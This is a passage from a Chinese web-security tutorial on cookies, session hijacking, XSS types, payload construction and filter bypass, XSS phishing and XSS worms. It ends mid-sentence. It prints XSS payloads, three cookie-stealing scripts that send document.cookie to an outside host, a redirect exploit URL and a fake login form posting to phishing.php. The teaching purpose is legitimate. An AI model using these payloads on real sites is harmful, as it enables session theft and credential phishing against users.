start="2"><li>本地Cookie与存储Cookie那种方式更安全?</li></ol><p>​采用本地Cookie可以让用户在未来某一段时间内都不需要进行登录操作，但是，如果攻击者通过XSS得到这样的本地Cookie后，就能够在未来很长一段时间内，甚至永久控制着目标用户的账号权限。但这并不意味着内存Cookie更安全，因为攻击者可以给内存Cookie加一个过期时间，使其变为本地Cookie。</p><ol start="3"><li>本地存储方式</li></ol><p>​浏览器本地存储是一种在浏览器中长久保存数据的方法，为本地数据持久化，当我们刷新页面或者同域名内页面跳转仍然可以保留数据。浏览器本地存储，对服务器来说减小存储压力;对用户来说，相应速度变快，提升用户体验。</p><p><img src="https://pic.imgdb.cn/item/6758488dd0e0a243d4e17fa4.png"></p><h4 id="4-4-4-HTTP协议安全"><a href="#4-4-4-HTTP协议安全" class="headerlink" title="4.4.4 HTTP协议安全"></a>4.4.4 HTTP协议安全</h4><h5 id="Weak-Session-lDs-弱会话IDs"><a href="#Weak-Session-lDs-弱会话IDs" class="headerlink" title="Weak Session lDs(弱会话IDs)"></a>Weak Session lDs(弱会话IDs)</h5><p>​当用户登录后，在服务器就会创建一个会话(Session)，叫做会话控制，再访问页面的时候就不用登录，只需要携带Session去访问。<br>​SessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该SessionlD，则攻击者将可以轻易获取访问权限，无需登录直接进入特定用户界面，进而执行其他操作。<br>​用户访问服务器的时候，在服务器端会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到<br>SessionlD就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionlD一旦在生命周期内被窃取，就等同于账户失窃。</p><p>​Session利用的实质：由于SessionID是用户登录之后持有的唯一认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如XSS、文件上传等等。<br>​Session劫持：就是一种通过窃取用户SessionlD，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionlD是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p><p><img src="https://pic.imgdb.cn/item/67584c30d0e0a243d4e180a9.png"></p><p><img src="https://pic.imgdb.cn/item/67584c78d0e0a243d4e180d8.png"></p><p><img src="https://pic.imgdb.cn/item/67584c99d0e0a243d4e180e1.png"></p><p><img src="https://pic.imgdb.cn/item/67584cc5d0e0a243d4e180f6.png"></p><p><img src="https://pic.imgdb.cn/item/67584cd7d0e0a243d4e1810a.png"></p><p><img src="https://pic.imgdb.cn/item/67584d06d0e0a243d4e18110.png"></p><p><img src="https://pic.imgdb.cn/item/67584d14d0e0a243d4e18112.png"></p><p><img src="https://pic.imgdb.cn/item/67584d49d0e0a243d4e1815a.png"></p><h5 id="HTTP协议存在的安全问题"><a href="#HTTP协议存在的安全问题" class="headerlink" title="HTTP协议存在的安全问题"></a>HTTP协议存在的安全问题</h5><p><img src="https://pic.imgdb.cn/item/67584d5dd0e0a243d4e18165.png"></p><h5 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h5><p><img src="https://pic.imgdb.cn/item/67584d8cd0e0a243d4e1818e.png"></p><p><img src="https://pic.imgdb.cn/item/67584dd0d0e0a243d4e181cb.png"></p><p><img src="https://pic.imgdb.cn/item/67584dfad0e0a243d4e181e4.png"></p><p><img src="https://pic.imgdb.cn/item/67584e1fd0e0a243d4e181f1.png"></p><p><img src="https://pic.imgdb.cn/item/67584e43d0e0a243d4e181f9.png"></p><p><img src="https://pic.imgdb.cn/item/67584e70d0e0a243d4e1820d.png"></p><p><img src="https://pic.imgdb.cn/item/67584e8fd0e0a243d4e18212.png"></p><p><img src="https://pic.imgdb.cn/item/67584edbd0e0a243d4e18222.png"></p><p><img src="https://pic.imgdb.cn/item/67584f3ad0e0a243d4e18232.png"></p><h4 id="4-4-5-XSS跨站脚本攻击–XSS漏洞概述"><a href="#4-4-5-XSS跨站脚本攻击–XSS漏洞概述" class="headerlink" title="4.4.5 XSS跨站脚本攻击–XSS漏洞概述"></a>4.4.5 XSS跨站脚本攻击–XSS漏洞概述</h4><h5 id="XSS漏洞概述"><a href="#XSS漏洞概述" class="headerlink" title="XSS漏洞概述"></a>XSS漏洞概述</h5><ol><li>XSS介绍</li></ol><p>​XSS被称为跨站脚本攻击(Cross-sitescripting)，由于和CSS(Cascading Style Sheets)重名，所以改为XSS。<br>​XSS主要基于javascript语言完成恶意的攻击行为，因为javascript可以非常灵活的操作html、css和浏览器。</p><p>​XSS就是指通过利用网页开发时留下的漏洞(由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript，但实际上也可以包括Java、VBScript、ActiveX、Flash 或者普通的HTML。</p><p>​当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。<br>​用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript 解释器，可以解析javascript，然而由于浏览器并不具有人格，不会判断代码是否恶意，只要代码符合语法规则，浏览器就会解析这段XSS代码。</p><p>​简单来说，XSS就是通过攻击者精心构造的JS代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击浏览器的效果。XSS攻击的对象是用户浏览器，属于被动攻击。因此XSS攻击涉及到三个角色:</p><ul><li>攻击者</li><li>用户浏览器</li><li>服务器</li></ul><p>​从上述可知，XSS属于客户端攻击，受害者最终是用户，不要以为受害者是用户就认为跟自己的网站、服务器安全就没有关系。不要忘记，网站的管理员也是用户之一!因为管理员要比普通用户权限大的多，可以利用当其跳板实施攻击。</p><p>实施XSS攻击需要具备的两个条件：</p><ul><li>需要向Web页面注入精心构造的恶意代码</li><li>对用户的输入没有做过滤，恶意代码能够被浏览器成功的执行</li></ul><ol start="2"><li>XSS验证</li></ol><p><img src="https://pic.imgdb.cn/item/67585465d0e0a243d4e1833d.png"></p><p>XSS验证语句：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;常用</span><br><span class="line">&lt;script&gt;confirm('xss')&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt("xss")&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>​在测试页面中提交上述的代码，浏览器执行后就能看到弹框的操作，弹窗的目的是验证JS代码是否被执行。我们发现，提交的代码&lt;script&gt;alert(‘xss”)&lt;/script&gt;，被当做字符串输出在HTML页面中，浏览器会根据&lt;script&gt;标签识别为JS代码，并会执行它，执行弹窗操作。也就是我们可以执行JS代码，验证了XSS漏洞的存在性。</p><ol start="3"><li>XSS危害</li></ol><ul><li>盗取各种用户账号</li><li>窃取用户Cookie资料，冒充用户身份进入网站</li><li>劫持用户会话，执行任意操作</li><li>刷流量，执行弹窗广告</li><li>传播蠕虫病毒</li><li>攻击者能在一定限度内记录用户的键盘输入</li></ul><h4 id="4-4-6-XSS跨站脚本攻击–XSS漏洞分类"><a href="#4-4-6-XSS跨站脚本攻击–XSS漏洞分类" class="headerlink" title="4.4.6 XSS跨站脚本攻击–XSS漏洞分类"></a>4.4.6 XSS跨站脚本攻击–XSS漏洞分类</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>​反射型XSS又称为非持久型XSS，是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。</p><p>​比如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。</p><p>编码伪装：</p><p><img src="https://pic.imgdb.cn/item/6758dae9d0e0a243d4e18bac.png"></p><p>短链接伪装：</p><p><img src="https://pic.imgdb.cn/item/6758db0ed0e0a243d4e18bae.png"></p><ul><li>特点<ul><li>非持久性</li><li>参数型脚本</li><li>反射型XSS的JS代码在Web应用的参数(变量)中，如搜索框等地方</li></ul></li><li>数据流量走向:浏览器-&gt;后端 -&gt;浏览器</li></ul><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>​存储型XSS又叫持久型XSS。一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</p><ul><li><p>特点</p><ul><li>持久性跨站脚本</li><li>持久性体现在JS代码不是在某个参数(变量)中，而是写进数据库或文件等可以永久保存数据的介质中，如留言板等地方</li></ul></li><li><p>数据流量走向：浏览器 -&gt;后端 -&gt;数据库 -&gt;后端 -&gt; 浏览器</p></li></ul><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p><img src="https://pic.imgdb.cn/item/6758dd86d0e0a243d4e18bda.png"></p><p>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种</p><ul><li>元素节点<ul><li>在“购物清单”例子中，&lt;body&gt;、&lt;p&gt;、&lt;u&gt;之类的元素在文档中的布局形成了文档的结构，它们即是元素节点。</li></ul></li><li>文本节点<ul><li>文档通常会包含一些内容，这些内容多数由文本提供，如前面例子中，&lt;p&gt;包含着文本“欢迎购买”，它就是一个文本节点。</li></ul></li><li>属性节点<ul><li>元素或多或少都有一些属性，属性用于对元素做出更具体的描述。</li></ul></li></ul><p>​DOM型XSS漏洞是基于<strong>文档对象模型</strong>(Document Object Model)的一种漏洞这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，<u><strong>触发XSS靠的是浏览器端的DOM解析</strong></u>。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如document.getElementByld(“x”).innerHTML、document.write等,</p><p><img src="https://pic.imgdb.cn/item/6758dfaad0e0a243d4e18bf8.png"></p><p><img src="https://pic.imgdb.cn/item/6758e029d0e0a243d4e18c0b.png"></p><p><img src="https://pic.imgdb.cn/item/6758e107d0e0a243d4e18c29.png"></p><p><img src="https://pic.imgdb.cn/item/6758e129d0e0a243d4e18c2c.png"></p><ul><li>特点<ul><li>非持久性</li></ul></li><li>数据流量走向：URL-&gt;浏览器</li></ul><h4 id="4-4-7-XSS跨站脚本攻击–Payload构造及变形"><a href="#4-4-7-XSS跨站脚本攻击–Payload构造及变形" class="headerlink" title="4.4.7 XSS跨站脚本攻击–Payload构造及变形"></a>4.4.7 XSS跨站脚本攻击–Payload构造及变形</h4><ol><li>利用【&lt;&gt;】构造HTML标签和&lt;script&gt;&lt;/script&gt;标签</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style="color:green;"&gt;XSS&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>利用HTML标签的属性值(伪协议)</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href="javascript:alert(/xss/)"&gt;touch me !&lt;/a&gt;</span><br><span class="line">&lt;img src="javascript:alert('xss")"&gt;(此标签需要在IE6下测试)</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>利用事件</li></ol><p>事件种类</p><ul><li>windows事件对windows 对象触发的事件</li><li>Form 事件          HTML 表单内的动作触发事件</li><li>Keyboard 事件  键盘按键</li><li>Mouse 事件   由鼠标或类似用户动作触发的事件</li><li>Media 事件    由多媒体触发的事件</li></ul><p>参考链接:<br><a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p><p><img src="https://pic.imgdb.cn/item/6758e391d0e0a243d4e18c68.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src= './smile.jpg' onmouseover='alert(/xss/)'&gt;</span><br><span class="line">&lt;img src=x onerror=alert(/xss/)&gt;</span><br><span class="line">&lt;input type="text" onclick="alert(/xss/)"&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>利用CSS</li></ol><p>可以利用CSS(层叠样式脚本)触发XSS。但是这种方法比较古老，基本上不适合现在主要的浏览器，但是从学习的角度，我们需要了解这种类型的XSS，以下代码均在IE6下测试:</p> <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">行内样式</span><br><span class="line">&lt;div style="background-image:url(javascript:alert(/xss/))"&gt;</span><br><span class="line">页内样式</span><br><span class="line">&lt;style&gt;Body{background-image:url(javascript:alert(/xss/))}&lt;/style&gt;</span><br><span class="line">外部样式</span><br><span class="line">&lt;link rel="stylesheet" type="text/css" href="./xss.css"&gt;</span><br><span class="line">expression</span><br><span class="line">&lt;div style="width:expression(alert(/xss/))"&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>大小写绕过</li></ol><p><img src="https://pic.imgdb.cn/item/6758e4b7d0e0a243d4e18c8d.png"></p><ol start="6"><li>双写绕过</li></ol><p><img src="https://pic.imgdb.cn/item/6758e4f0d0e0a243d4e18c94.png"></p><ol start="7"><li>引号，反引号有时可以代替单双引号和括号</li></ol><p><img src="https://pic.imgdb.cn/item/6758e5a1d0e0a243d4e18ca2.png"></p><ol start="8"><li>【/】代替空格</li></ol><p><img src="https://pic.imgdb.cn/item/6758e616d0e0a243d4e18cb6.png"></p><ol start="9"><li>Tab与回车</li></ol><p><img src="https://pic.imgdb.cn/item/6758e64ed0e0a243d4e18cbc.png"></p><ol start="10"><li>编码</li></ol><p><img src="https://pic.imgdb.cn/item/6758e693d0e0a243d4e18ce1.png"></p><p><img src="https://pic.imgdb.cn/item/6758e6eed0e0a243d4e18cf8.png"></p><h4 id="4-4-8-Cookie攻击"><a href="#4-4-8-Cookie攻击" class="headerlink" title="4.4.8 Cookie攻击"></a>4.4.8 Cookie攻击</h4><h5 id="Cookie基础"><a href="#Cookie基础" class="headerlink" title="Cookie基础"></a>Cookie基础</h5><ol><li>简介</li></ol><p><img src="https://pic.imgdb.cn/item/6758e885d0e0a243d4e18d28.png"></p><ol start="2"><li>Cookie特性</li></ol><ul><li>同一个网站中所有的页面共享一套Cookie(因为不可能在同一个网站，打开页面都要登录一次，以域名为单位)</li><li>数量、大小限制(过大的存储是不现实的)</li><li>过期时间(如果不设置过期时间，关闭浏览器就会自动清除Cookie)</li></ul><ol start="3"><li>Cookie作用</li></ol><ul><li>Cookie最大作用维持会话的凭证</li><li>减少登录网站的次数</li><li>记录关于用户信息</li></ul><ol start="4"><li>Cookie类型</li></ol><p>根据Cookie的时效性以及相关特点，可以把它分为两种类型：<strong>持久型Cookie</strong>和<strong>临时型Cookie</strong>。</p><ul><li>持久型Cookie以文本形式存储在硬盘上，由浏览器存取</li><li>临时型Cookie也称为会话Cookie，存储在内存中，关闭当前浏览器后会立即消失</li></ul><ol start="5"><li>Cookie属性</li></ol><ul><li>Name–Cookie的名称;</li><li>Value–读写Cookie的值;</li><li>Expires–通过给定一个过期时间来创建一个持久化Cookie:</li><li>Path–关联到Cookie的路径，默认为/</li><li>Domain–设置关联Cookie的域名;</li><li>Secure–用于指定Cookie需要通过安全Socket层连接传递</li><li>HttpOnly–用于避免Cookie被JavaScript访问</li></ul><ol start="6"><li>Cookie操作</li></ol><p>浏览器通过Document对象访问Cookie。<br>若要创建一个Cookie，只要将特定格式的字符串赋给document.cookie即可<br>        cookieName=cookieValue;expirationdate;path<br>后端语言处理方式:<br>        PHP setrawcookie()<br>                setcookie()</p><p><img src="https://pic.imgdb.cn/item/6758ead2d0e0a243d4e18d7d.png"></p><p><img src="https://pic.imgdb.cn/item/6758eb11d0e0a243d4e18d86.png"></p><h5 id="Cookie攻击"><a href="#Cookie攻击" class="headerlink" title="Cookie攻击"></a>Cookie攻击</h5><ol><li>常见的Cookie攻击方式</li></ol><p>​实现基于HTTP Cookie攻击的前提是目标系统在Cookie中保存了用户ID、凭证状态等其它可以用来进行攻击的信息。<br>常见的基于Cookie的攻击方式有三种：<br>​1、直接访问Cookie文件查找想要的机密信息<br>​2、在客户端和服务端进行Cookie信息传递的时候进行窃取，从而冒充合法用户操作;<br>​3、攻击者修改Cookie信息，所以在服务端接收到客户端获取的Cookie信息的时候就会对攻击者伪造过的Cookie信息操作。</p><ol start="2"><li>获取Cookie信息的主要途径</li></ol><ul><li>直接读取磁盘的Cookie文件;</li><li>使用网络嗅探器来获取网络上传输的Cookie;</li><li>使用Cookie管理工具获取内存或文件系统中的Cookie</li><li>使用跨站脚本盗取Cookie</li></ul><ol start="3"><li>获取客户端cookie信息</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、&lt;script&gt; document.location="http://www.test.com/cookie.asp?cookie="+document.cookie &lt;/script&gt;</span><br><span class="line">2、&lt;script&gt; new lmage().src="http://www.test.com/cookie.asp?cookie="+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">3、&lt;script&gt; document.write('&lt;img src="http://www.test.com/cookie.asp?cookie='+document.cookie+'" width=0 height=0 border=0 /&gt;');&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/6758eddad0e0a243d4e18e3a.png"></p><ol start="4"><li>相关函数介绍</li></ol><p><img src="https://pic.imgdb.cn/item/6758ee4fd0e0a243d4e18e56.png"></p><p><img src="https://pic.imgdb.cn/item/6758ee62d0e0a243d4e18e58.png"></p><p><img src="https://pic.imgdb.cn/item/6758ee7cd0e0a243d4e18e60.png"></p><h5 id="XSS钓鱼攻击"><a href="#XSS钓鱼攻击" class="headerlink" title="XSS钓鱼攻击"></a>XSS钓鱼攻击</h5><p>​网络钓鱼(Phishing)是一种利用欺骗性的电子邮件和伪造的Web站点进行网络诈骗，意图引诱受害者给出敏感信息(如用户名、口令、身份证号等信息)的攻击手段，主要通过对受害者心理弱点、好奇心、信任度等心理陷阱来实现诈骗。属于社会工程学的一种。<br>假设有一个网页文件含有以下HTML代码<br>​&lt;a href=”<a href="http://www.qq.com">百度\"&gt;http://www.qq.com"&gt;百度\</a></p><ol><li>XSS重定向钓鱼(XSS Redirect Phishing)</li></ol><p>将正常用户访问重定向到恶意网站，将恶意网站伪造的和正常访问的网站一样。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设www.bug.com上有一处XSS</span><br><span class="line">http://www.bug.com/index.php?search=【Expliot】</span><br><span class="line">Exploit:</span><br><span class="line">http://www.bug.com/index.php?search="'&gt;&lt;script&gt;document.location.href ="http://www.baidu.com"&lt;/script&gt;</span><br><span class="line">这样便会让用户从当前访问的网站跳转到一个钓鱼网站。</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>HTML注入式钓鱼(XSS HTMLInject Phishing)</li></ol><p>HTML注入式钓鱼是指直接利用XSS漏洞注入HTML或JavaScript代码到页面中</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">Method</span>=<span class="string">"PosT"</span> <span class="attr">Action</span>=<span class="string">"phishing.php"</span> <span class="attr">Name</span>=<span class="string">"form"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>Login:<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"login"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>Password:<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Password"</span> <span class="attr">type</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Valid"</span> <span class="attr">value</span>=<span class="string">"Ok"</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><pre><code>    &lt;div style="text-align:center;"&gt;        &lt;form Method="PosT" Action="phishing.php" Name="form"&gt;&lt;br /&gt;            &lt;br /&gt;Login:&lt;br/&gt;            &lt;input name="login"/&gt;            &lt;br /&gt;Password:&lt;br/&gt;            &lt;input name="Password" type="password" /&gt;&lt;br/&gt;&lt;br/&gt;            &lt;input name="Valid" value="Ok" type="submit" /&gt;&lt;br/&gt;        &lt;/form&gt;    &lt;/div&gt;</code></pre><p>​<img src="https://pic.imgdb.cn/item/6758f0b4d0e0a243d4e18ee9.png"></p><ol start="3"><li>iframe钓鱼</li></ol><p>iframe钓鱼是通过标签嵌入远程域的一个页面实施钓鱼。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="http://www.baidu.com" height="100%" width="100%"&lt;/iframe&gt;</span><br></pre></td></tr></tbody></table></figure><iframe src="http://www.baidu.com" height="100%" width="100%" <="" iframe=""><ol start="4"><li>高级钓鱼技术</li></ol><p>注入代码劫持HTML表单、使用JavaScript编写键盘记录器等</p><h4 id="4-4-9-XSS-Worm"><a href="#4-4-9-XSS-Worm" class="headerlink" title="4.4.9 XSS Worm"></a>4.4.9 XSS Worm</h4><h5 id="XSS-Worm介绍"><a href="#XSS-Worm介绍" class="headerlink" title="XSS Worm介绍"></a>XSS Worm介绍</h5><ol><li>蠕虫案例剖析</li></ol><p>​2005年10月4日，世界上第一只“Web 2.0蠕虫”诞生了。当时有人在国外著名社交网络MySpace上写了一段JavaScript 蠕虫代码，利用 Ajax 方法让无数的用户在毫不知情的情况下把作者加入了好友名单，同时在他们的个人简介里自动加上了“samy is my hero”的字样。此 Samy XSS Worm在MySpace上疯狂散播，一天内就感染了超过100万用户。由于极其惊人的传播速度，最终导致MySpace服务器崩溃</p><ol start="2"><li>XSS Worm 定义</li></ol><p>​所谓的跨站脚本蠕虫(XSS Worm)，实质上是一段脚本程序，通常用JavaScript或Vbscript写成，在用户浏览XSS页面时被激活。蠕虫利用站点页面的XSS漏洞根据其特定规则进行传播和感染。<br>​值得注意的是，XSS蠕虫只是Web 2.0蠕虫的其中一种，也是最广为人知的一种，它利用网站的XSS漏洞进行散播。Web 2.0蠕虫还有其他形式，如CSRFWorm，顾名思义，该类蠕虫是利用网站的CSRF漏洞进行攻击。</p><ol start="3"><li>蠕虫攻击流程</li></ol><p>（1）攻击者发现目标网站存在XSS漏洞，并且可以编写XSS蠕虫。<br>（2）利用一个宿主(如博客空间)作为传播源头进行XSS攻击。<br>（3）当其他用户访问被感染的空间时，XSS蠕虫执行以下操作。</p><p>​判断用户是否登录，如果已登录就执行下一步；如果没登录则执行其他操作。<br>​继续判断该用户是否被感染，如果没有就将其感染；如果已感染则跳过。</p><p><img src="https://pic.imgdb.cn/item/6758f395d0e0a243d4e18fc8.png"></p><h5 id="XSS-Worm剖析"><a href="#XSS-Worm剖析" class="headerlink" title="XSS Worm剖析"></a>XSS Worm剖析</h5><p>编写一只完整的XSS蠕虫并不困难，一般需要具有Web开发经验，此外还要对目标程序网站的应用层逻辑和XSS Worm的业务流程有所了解。<br>（1）寻找XSS点<br>（2）实现蠕虫行为<br>（3）收集蠕虫数据<br>（4）传播与感染</p><ol><li>运用DOM技术</li></ol><p>​构建一只完整的XSS Worm，不可避免地要使用许多DOM节点技术。<br>​如访问页面元素的DOM HTML表单，可以使用不同的技术，常见的方法是给出一个特定的标识符(ID)，然后使用document的getElementByld()函数来访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">……</span><br><span class="line">var div1=document.getElementByld( “div1”);</span><br><span class="line">遍历DOM是一种平滑的体验，另外还有两种强大的方法:</span><br><span class="line">document.getElementByname //获得指定name的&lt;html&gt;标签相关信息</span><br><span class="line">document.getElementByTagName //获得指定的&lt;html&gt;标签相关信息</span><br></pre></td></tr></table></figure><p>所有的DOM元素无外乎分为两种：文本和元素。使用<strong>innerHTML</strong>属性就可以从一个元素中提取所有的HTML和文本。具体代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;tr1&quot;&gt;</span><br><span class="line">&lt;h1&gt;hello world!&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(document.getElementByld(&quot;tr1&quot;).innerHTML);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>使用 innerHTML方法还可以向HTML DOM中插入新内容，具体示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href= “#” onclick= &quot;this.innerHTML= &#x27;&lt;h1&gt;this is new message&lt;/h1&gt;&#x27; &quot;&gt;Old message&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>用浏览器打开含上述HTML代码的文档，单击Old message超级链接，此时页面会替换当前标签中的内容。插入&lt;html&gt;标签语句的位置可以指定为:<br>        a.beforeBegin:插入到标签开始标记前<br>        b.afterBegin:插入到标签开始标记后<br>        c.beforeEnd:插入到标签结束标记前<br>        d.afterEnd:插入到标签结束标记后</p><p><img src="https://pic.imgdb.cn/item/6758f683d0e0a243d4e19073.png"></p><p><img src="https://pic.imgdb.cn/item/6758f6bad0e0a243d4e190e0.png"></p><p><img src="https://pic.imgdb.cn/item/6758f75ad0e0a243d4e1921e.png"></p><h5 id="蠕虫攻击实例"><a href="#蠕虫攻击实例" class="headerlink" title="蠕虫攻击实例"></a>蠕虫攻击实例</h5><p>​2011年6月28日，国内最火的信息发布平台之–新浪微博(<a 